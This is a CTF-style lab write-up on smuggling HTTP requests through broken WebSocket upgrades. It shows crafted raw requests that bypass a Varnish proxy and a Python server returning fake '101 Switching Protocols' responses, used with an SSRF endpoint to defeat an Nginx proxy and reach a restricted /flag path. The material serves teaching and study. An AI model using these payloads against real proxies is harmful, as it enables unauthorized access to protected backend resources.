## Intro 

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/57fcdd41-e1df-47ea-8188-eec08a6817af)

## Websockets

The WebSocket protocol allows the creation of **two-way communication channels** between a browser and a server by establishing a long-lasting connection that can be used for **full-duplex communications**.

WebSocket connections are normally created using client-side JavaScript like the following:

```js
var ws = new WebSocket("wss://normal-website.com/chat");
```

### Upgrading HTTP connections to Websockets:

To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

If the server accepts the connection, it returns a WebSocket handshake response like the following:

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

- The client sends an initial HTTP request with an `Upgrade: websocket` header and other additional headers.
- If the server supports WebSockets, it responds with a `101 Switching Protocols` response and upgrades the connection accordingly.
- From that point onwards, the connection uses the WebSocket protocol instead of HTTP.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/908a4716-6f78-4188-b381-d8fb78e4497d)

> 1. The `Connection` and `Upgrade` headers in the request and response **indicate that this is a WebSocket handshake**.
> 2. The `Sec-WebSocket-Version` request header **specifies the WebSocket protocol version** that the client wishes to use. This is typically 13.
> 3. The `Sec-WebSocket-Key` request header **contains a Base64-encoded random value**, which should be randomly generated in each handshake request.
> 4. The `Sec-WebSocket-Accept` response header **contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification**. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.


If we now add a proxy in the middle, something interesting happens: 

- Instead of fronting the connections themselves, **most proxies won't handle the upgrade but will instead relay them to the backend server**.
- **Once the connection is upgraded, the proxy will establish a tunnel between the client and server**, so any further WebSocket traffic is forwarded without interruptions.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/39ec08c2-ca0b-42cb-824e-0f1b6684d4b7)

## Abusing Websockets for Request Smuggling

### Smuggling HTTP requests through broken WebSocket Tunnels:

- To smuggle requests through a vulnerable proxy, we can create a malformed request such that **_the proxy thinks a WebSocket upgrade is performed, but the backend server doesn't really upgrade the connection_**.
- This will **_force the proxy into establishing a tunnel between client and server that will go unchecked since it assumes it is now a WebSocket connection, but the backend will still expect HTTP traffic_**.

But how to do it?

- One way to force this is to send an upgrade request with an invalid `Sec-Websocket-Version` header.
- If the server supports the requested version, it should issue a `101 Switching Protocols` response and upgrade the connection.

But we aren't interested in upgrading the connection.

- If we send an** _unsupported value_** for the `Sec-Websocket-Version` header, the server will send a `426 Upgrade Required` response to indicate the upgrade was unsuccessful.

The Attack scenario is as follows:
1. The client sends a _WebSocket upgrade request with an invalid version number_.
2. The proxy forwards the request to the backend server.
3. The backend server responds with _426 Upgrade Required_. **_The connection doesn't upgrade, so the backend remains using HTTP instead of switching to a WebSocket connection_**.
4. **_The proxy doesn't check the server response and assumes the upgrade was successful_**. Any further communications will be tunnelled since the proxy believes they are part of an upgraded WebSocket connection.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/41206db5-958a-4204-abed-4923a8c847cd)

### DEMO : Bypassing Proxy Restrictions:

- An application has a flag at - http://MACHINE_IP:8001/flag
- A misconfigured **Varnish proxy** is in between the client and the backend server.
- Websocket endpoint is at - http://10.10.243.36:8001/socket

If we try to access the _/flag_ directly, we get this error message which was sent by Varnish (the proxy) instead of the backend application.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/f3d09586-4bed-4eff-b6fc-b00ff5b8e999)

But if we try to access any nonexistent resource , this time we get the error message from the backend server & not the proxy.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/39e63cf3-2352-4cea-ac98-e0f1c5c0dea7)

If we can somehow get past the proxy then we can access the restricted flag content. For this we can use WebSocket communication.

Like in the above mentioned steps, if we trick the proxy to beleive we have made a WS connection to the backend & then send a GET request to the backend server , we can get the contents of the flag.

We can send the following crafted request to the http://10.10.243.36:8001/socket endpoint.

```http
GET /socket HTTP/1.1
Host: 10.10.243.36:8001
Upgrade: websocket
Sec-WebSocket-Version: 779
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Upgrade-Insecure-Requests: 1
Connection: Upgrade

GET /flag HTTP/1.1
Host:10.10.243.36:8001


```
Note the 2 newlines at the end (CRLF) - [The HTTP/1.1 protocol specifies that the header section must be followed by a blank line. This blank line (represented by \r\n\r\n) is essential for the server to parse the request correctly. It also distinguishes between headers and the optional body in a request.]

Also we need to set burp to make sure it does not update the Content-Length.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/42ee0c35-8094-4680-9cb5-16e443815dcd)

Just as expected, we get a **426 error from the initial attempt to upgrade the connection to a WebSocket**. At this point, the proxy believes the rest of the connection uses the WebSocket protocol and will tunnel everything directly to the backend server, including our smuggled request for /flag.

### What if the App Doesn't Speak WebSocket?

Even if the application does not have a socket for WS communication, all we need is to fool the proxy into believing we are establishing a connection to a WebSocket, even if this isn't true.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/8c31c2f5-72de-4387-b440-fb6ae13b08bf)

This payload should still work, even though the first request is directed to /, which is not a WebSocket-enabled endpoint. The proxy simply doesn't check the response from the upgrade, so you can use any payload that looks close enough to a WebSocket upgrade.

## Defeating Secure Proxies

- An application has a flag at - http://10.10.243.36:8002/flag
- A secure **Nginx proxy** is in between the client and the backend server.
- Websocket endpoint is at - http://10.10.243.36:8002/socket
- SSRF vulnerable endpoint is at - http://10.10.243.36:8002/check-url?server=<url>

Now the same trick which we used previously won't work as the nginx proxy checks the response code of the ws upgrade unlike the varnish proxy.

Since the response status code is **426 Upgrade Required**, the nginx proxy udnerstands that **_no valid WebSocket connection was established; therefore, it won't allow us to smuggle the /flag request.**

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/e2e78d6e-193c-4030-8d43-b164ea8f9bd6)

### How to trick the Proxy ?

Since we can't just smuggle requests anymore, **we need to somehow force the backend web server to reply to our upgrade request with a fake `101 Switching Protocols` response without actually upgrading the connection in the backend**.

If our target application has an **SSRFvulnerability** that allows us to proxy requests back to a server we control as attackers, we might be able to inject the `101 Switching Protocols` response to an arbitrary request. In these special cases, we should be able to smuggle requests through a fake WebSocket connection again.

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/faa26efe-6a55-40a4-9b95-f996ef141701)

### Leveraging SSRF 

The application allows us to test the status of a URL. Each time we input a URL, the server will make a request to http://10.10.94.57:8002/check-url?server=<url> and return the status code from the corresponding response:

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/b3b3d502-8a1e-41e3-8374-b3f19ba63572)

We also get a request to our python server 

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 5555
Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
10.10.94.57 - - [25/May/2024 08:46:12] "GET /fakeendpoint HTTP/1.1" 404 -
```

We can  set up a web server that **responds with status 101 to every request** with the following Python code:

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Now when we request the webserver address, it responds with `101 Switching Protocols` so the nginx proxy trusts that an ws communication has been established & hence sends all the requests directly to the backend. As a result the backend now responds back with the content.

```http
GET /check-url?server=http://10.11.79.80:5555 HTTP/1.1
Host: 10.10.94.57:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1

Host: 10.10.94.57:8002


```

**Note that `Sec-WebSocket-Version: 13` header. Here we didn't send invalid version number because we indeed want our webserver to respond with `101` status code.**

```bash
┌──(kali㉿kali)-[~]
└─$ python3 response.py 5555
10.10.94.57 - - [25/May/2024 08:59:33] "GET / HTTP/1.1" 101 -
```

![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/3cf27519-c6f1-4de6-ae27-be925bc2502a)

